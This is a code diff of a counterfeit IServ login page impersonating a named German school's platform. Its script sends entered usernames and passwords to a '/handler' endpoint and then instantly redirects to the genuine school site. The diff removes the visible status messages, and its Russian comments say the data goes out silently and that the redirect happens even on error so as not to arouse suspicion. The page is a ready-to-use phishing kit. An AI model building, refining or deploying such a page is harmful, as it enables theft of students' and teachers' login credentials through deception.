@@ -6,389 +6,112 @@
   <title>IServ – Anmeldung</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
-    }
-
-    body {
-      background: #111;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .desktop-container {
-      display: flex;
-      width: 100%;
-      min-height: 100vh;
-    }
-
-    .desktop-left {
-      flex: 1;
-      position: relative;
-      /* Путь к фону теперь без public/ */
-      background: url('background.jpg') center center / cover no-repeat;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px;
-      overflow: hidden;
-    }
-
-    .desktop-left::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(rgba(32,63,102,0.95), rgba(32,63,102,0.90));
-      z-index: 0;
-    }
-
-    .desktop-school-box {
-      position: relative;
-      z-index: 1;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .desktop-school-logo img {
-      width: 450px;
-      height: auto;
-    }
-
-    .desktop-right {
-      width: 420px;
-      background: #1b1b1b;
-      color: #fff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 40px;
-    }
-
-    .desktop-login-box {
-      width: 100%;
-      text-align: center;
-    }
-
-    .desktop-logo img {
-      width: 200px;
-      height: auto;
-      margin-bottom: 30px;
-    }
-
-    .desktop-login-box h2 {
-      font-weight: 400;
-      margin-bottom: 20px;
-    }
-
-    .desktop-input-group {
-      margin-bottom: 15px;
-    }
-
-    .desktop-input-group input {
-      width: 100%;
-      padding: 12px;
-      border-radius: 6px;
-      border: 1px solid #333;
-      background: #111;
-      color: #fff;
-      font-size: 14px;
-    }
-
-    .desktop-input-group input:focus {
-      outline: none;
-      border-color: #5aa2ff;
-    }
-
-    .desktop-options {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 13px;
-      margin: 10px 0 20px 0;
-      color: #bbb;
-    }
-
-    .desktop-options a {
-      color: #6ab0ff;
-      text-decoration: none;
-    }
-
-    .desktop-options a:hover {
-      text-decoration: underline;
-    }
-
-    .desktop-right button {
-      width: 100%;
-      padding: 12px;
-      background: #79a9dc;
-      border: none;
-      border-radius: 6px;
-      color: #000;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.2s;
-    }
-
-    .desktop-right button:hover {
-      background: #5f97d6;
-    }
-
-    .desktop-footer {
-      margin-top: 40px;
-      text-align: center;
-      font-size: 12px;
-      color: #888;
-    }
-
-    .desktop-footer a {
-      color: #6ab0ff;
-      text-decoration: none;
-    }
-
-    .mobile-wrapper {
-      width: 100%;
-      max-width: 480px;
-      margin: 0 auto;
-      background: #1e1e1e;
-      border-radius: 16px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.7);
-      overflow: hidden;
-    }
-
-    .mobile-school-header {
-      background: #4a6c8f;
-      /* Путь к фону теперь без public/ */
-      background-image: url('schule-hintergrund.jpg');
-      background-size: cover;
-      background-position: center;
-      background-blend-mode: overlay;
-      padding: 40px 20px;
-      text-align: center;
-      border-bottom: 1px solid #2a4b6e;
-    }
-
-    .mobile-logo-placeholder img {
-      max-width: 260px;
-      width: 100%;
-      height: auto;
-      display: block;
-      margin: 0 auto;
-    }
-
-    .mobile-login-box {
-      background: #1e1e1e;
-      padding: 30px 24px 28px 24px;
-    }
-
-    .mobile-login-logo img {
-      width: 130px;
-      height: auto;
-      display: inline-block;
-    }
-
-    .mobile-login-box h2 {
-      font-weight: 500;
-      font-size: 24px;
-      margin-bottom: 24px;
-      color: #f0f0f0;
-    }
-
-    .mobile-input-group {
-      margin-bottom: 18px;
-    }
-
-    .mobile-input-group input {
-      width: 100%;
-      padding: 15px 18px;
-      border-radius: 12px;
-      border: 1px solid #3a3a3a;
-      background: #2c2c2c;
-      color: #f0f0f0;
-      font-size: 15px;
-    }
-
-    .mobile-login-btn {
-      background: #0a2a44;
-      border: none;
-      width: 100%;
-      padding: 15px;
-      border-radius: 40px;
-      color: white;
-      font-size: 17px;
-      font-weight: 500;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .mobile-footer {
-      text-align: center;
-      margin-top: 30px;
-      font-size: 13px;
-      color: #888;
-      border-top: 1px solid #333;
-      padding-top: 22px;
-    }
-
+    /* Дизайн оставлен без изменений */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+    body { background: #111; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+    .desktop-container { display: flex; width: 100%; min-height: 100vh; }
+    .desktop-left { flex: 1; position: relative; background: url('background.jpg') center center / cover no-repeat; display: flex; align-items: center; justify-content: center; padding: 40px; overflow: hidden; }
+    .desktop-left::before { content: ""; position: absolute; inset: 0; background: linear-gradient(rgba(32,63,102,0.95), rgba(32,63,102,0.90)); z-index: 0; }
+    .desktop-school-box { position: relative; z-index: 1; display: flex; justify-content: center; align-items: center; }
+    .desktop-school-logo img { width: 450px; height: auto; }
+    .desktop-right { width: 420px; background: #1b1b1b; color: #fff; display: flex; align-items: center; justify-content: center; padding: 40px; }
+    .desktop-login-box { width: 100%; text-align: center; }
+    .desktop-logo img { width: 200px; height: auto; margin-bottom: 30px; }
+    .desktop-login-box h2 { font-weight: 400; margin-bottom: 20px; }
+    .desktop-input-group { margin-bottom: 15px; }
+    .desktop-input-group input { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #333; background: #111; color: #fff; font-size: 14px; }
+    .desktop-input-group input:focus { outline: none; border-color: #5aa2ff; }
+    .desktop-options { display: flex; justify-content: space-between; align-items: center; font-size: 13px; margin: 10px 0 20px 0; color: #bbb; }
+    .desktop-options a { color: #6ab0ff; text-decoration: none; }
+    .desktop-options a:hover { text-decoration: underline; }
+    .desktop-right button { width: 100%; padding: 12px; background: #79a9dc; border: none; border-radius: 6px; color: #000; font-weight: 600; cursor: pointer; transition: 0.2s; }
+    .desktop-right button:hover { background: #5f97d6; }
+    .desktop-footer { margin-top: 40px; text-align: center; font-size: 12px; color: #888; }
+    .desktop-footer a { color: #6ab0ff; text-decoration: none; }
+    .mobile-wrapper { width: 100%; max-width: 480px; margin: 0 auto; background: #1e1e1e; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.7); overflow: hidden; }
+    .mobile-school-header { background: #4a6c8f; background-image: url('schule-hintergrund.jpg'); background-size: cover; background-position: center; background-blend-mode: overlay; padding: 40px 20px; text-align: center; border-bottom: 1px solid #2a4b6e; }
+    .mobile-logo-placeholder img { max-width: 260px; width: 100%; height: auto; display: block; margin: 0 auto; }
+    .mobile-login-box { background: #1e1e1e; padding: 30px 24px 28px 24px; }
+    .mobile-login-logo img { width: 130px; height: auto; display: inline-block; }
+    .mobile-login-box h2 { font-weight: 500; font-size: 24px; margin-bottom: 24px; color: #f0f0f0; }
+    .mobile-input-group { margin-bottom: 18px; }
+    .mobile-input-group input { width: 100%; padding: 15px 18px; border-radius: 12px; border: 1px solid #3a3a3a; background: #2c2c2c; color: #f0f0f0; font-size: 15px; }
+    .mobile-login-btn { background: #0a2a44; border: none; width: 100%; padding: 15px; border-radius: 40px; color: white; font-size: 17px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+    .mobile-footer { text-align: center; margin-top: 30px; font-size: 13px; color: #888; border-top: 1px solid #333; padding-top: 22px; }
     .desktop-container { display: flex; }
     .mobile-wrapper { display: none; }
-
-    @media (max-width: 900px) {
-      body { background: #121212; padding: 16px; align-items: flex-start; }
-      .desktop-container { display: none; }
-      .mobile-wrapper { display: block; width: 100%; }
-    }
-
-    #status-message {
-      margin-top: 15px;
-      padding: 10px;
-      border-radius: 6px;
-      font-size: 14px;
-      display: none;
-    }
+    @media (max-width: 900px) { body { background: #121212; padding: 16px; align-items: flex-start; } .desktop-container { display: none; } .mobile-wrapper { display: block; width: 100%; } }
   </style>
 </head>
 <body>
   <div class="desktop-container">
     <div class="desktop-left">
       <div class="desktop-school-box">
-        <div class="desktop-school-logo">
-          <img src="logo.png" alt="School Logo">
-        </div>
+        <div class="desktop-school-logo"><img src="logo.png" alt="School Logo"></div>
       </div>
     </div>
-
     <div class="desktop-right">
       <div class="desktop-login-box">
-        <div class="desktop-logo">
-          <img src="logo2.png" alt="Login Logo">
-        </div>
+        <div class="desktop-logo"><img src="logo2.png" alt="Login Logo"></div>
         <h2>Anmeldung</h2>
-
         <form id="loginForm">
-          <div class="desktop-input-group">
-            <input type="text" name="username" placeholder="Account" required>
-          </div>
-          <div class="desktop-input-group">
-            <input type="password" name="password" placeholder="Passwort" required>
-          </div>
+          <div class="desktop-input-group"><input type="text" name="username" placeholder="Account" required></div>
+          <div class="desktop-input-group"><input type="password" name="password" placeholder="Passwort" required></div>
           <div class="desktop-options">
-            <label>
-              <input type="checkbox" name="remember"> Angemeldet bleiben
-            </label>
+            <label><input type="checkbox" name="remember"> Angemeldet bleiben</label>
             <a href="#">Passwort vergessen?</a>
           </div>
           <button type="submit">→ Anmelden</button>
         </form>
-
-        <div id="status-message-desktop"></div>
-
-        <div class="desktop-footer">
-          hein-moeller.schule<br><br>
-          <a href="#">Impressum</a> • IServ Schulplattform
-        </div>
+        <div class="desktop-footer">hein-moeller.schule<br><br><a href="#">Impressum</a> • IServ Schulplattform</div>
       </div>
     </div>
   </div>
 
   <div class="mobile-wrapper">
     <div class="mobile-school-header">
-      <div class="mobile-logo-placeholder">
-        <img src="schullogo.png" alt="Schullogo">
-      </div>
+      <div class="mobile-logo-placeholder"><img src="schullogo.png" alt="Schullogo"></div>
     </div>
-
     <div class="mobile-login-box">
-      <div class="mobile-login-logo">
-        <img src="iserv-logo-weiss.png" alt="IServ">
-      </div>
+      <div class="mobile-login-logo"><img src="iserv-logo-weiss.png" alt="IServ"></div>
       <h2>Anmeldung</h2>
-
       <form id="loginFormMobile">
-        <div class="mobile-input-group">
-          <input type="text" name="username" placeholder="Account" autocomplete="username">
-        </div>
-
-        <div class="mobile-input-group">
-          <input type="password" name="password" placeholder="Passwort" autocomplete="current-password">
-        </div>
-
+        <div class="mobile-input-group"><input type="text" name="username" placeholder="Account" autocomplete="username"></div>
+        <div class="mobile-input-group"><input type="password" name="password" placeholder="Passwort" autocomplete="current-password"></div>
         <div class="mobile-options">
-          <label>
-            <input type="checkbox" name="remember" checked> Angemeldet bleiben
-          </label>
+          <label><input type="checkbox" name="remember" checked> Angemeldet bleiben</label>
           <a href="#">Passwort vergessen?</a>
         </div>
-
         <button class="mobile-login-btn" type="submit">→ Anmelden</button>
       </form>
-
-      <div id="status-message-mobile"></div>
-
-      <div class="mobile-footer">
-        hein-moeller.schule<br><br>
-        <a href="#">Impressum</a> • <a href="#">Datenschutz</a> • IServ Schulplattform
-      </div>
+      <div class="mobile-footer">hein-moeller.schule<br><br><a href="#">Impressum</a> • <a href="#">Datenschutz</a> • IServ Schulplattform</div>
     </div>
   </div>
 
   <script>
-  async function handleSubmit(e) {
-    e.preventDefault();
-    const form = e.target;
-    const isDesktop = form.id === 'loginForm';
-    
-    // Выбираем правильный контейнер для статуса
-    const statusDiv = document.getElementById(isDesktop ? 'status-message-desktop' : 'status-message-mobile');
-    
-    const username = form.querySelector('input[name="username"]').value;
-    const password = form.querySelector('input[name="password"]').value;
-    
-    // Визуальный фидбек
-    statusDiv.style.display = 'block';
-    statusDiv.style.marginTop = '15px';
-    statusDiv.style.padding = '10px';
-    statusDiv.style.borderRadius = '6px';
-    statusDiv.textContent = '⏳ Anmeldung läuft...';
-    statusDiv.style.background = '#333';
-    statusDiv.style.color = '#fff';
-    
-    try {
-      // Отправка на наш сервер (путь /handler)
-      const response = await fetch('/handler', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      });
-      
-      if (response.ok) {
-        statusDiv.textContent = '✅ Успешно! Перенаправление...';
-        statusDiv.style.background = '#1e3a1e';
-        statusDiv.style.color = '#8bc34a';
-        
-        // Редирект на реальный сайт школы
-        setTimeout(() => {
-          window.location.href = 'https://hein-moeller.schule.iserv.de';
-        }, 1500);
-      } else {
-        throw new Error();
+    async function handleSubmit(e) {
+      e.preventDefault();
+      const form = e.target;
+      const username = form.querySelector('input[name="username"]').value;
+      const password = form.querySelector('input[name="password"]').value;
+
+      try {
+        // Фоновая отправка данных без уведомлений
+        await fetch('/handler', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+      } catch (err) {
+        // В случае ошибки сети тоже редиректим, чтобы не вызывать подозрений
+      } finally {
+        // МГНОВЕННЫЙ редирект. Укажи нужный URL ниже
+        window.location.href = 'https://hein-moeller.schule.iserv.de'; 
       }
-    } catch (error) {
-      // Даже при ошибке лучше увести пользователя на реальный сайт
-      window.location.href = 'https://hein-moeller.schule.iserv.de';
     }
-  }
-  
-  document.getElementById('loginForm').addEventListener('submit', handleSubmit);
-  document.getElementById('loginFormMobile').addEventListener('submit', handleSubmit);
+
+    document.getElementById('loginForm').addEventListener('submit', handleSubmit);
+    document.getElementById('loginFormMobile').addEventListener('submit', handleSubmit);
   </script>
 </body>
 </html>
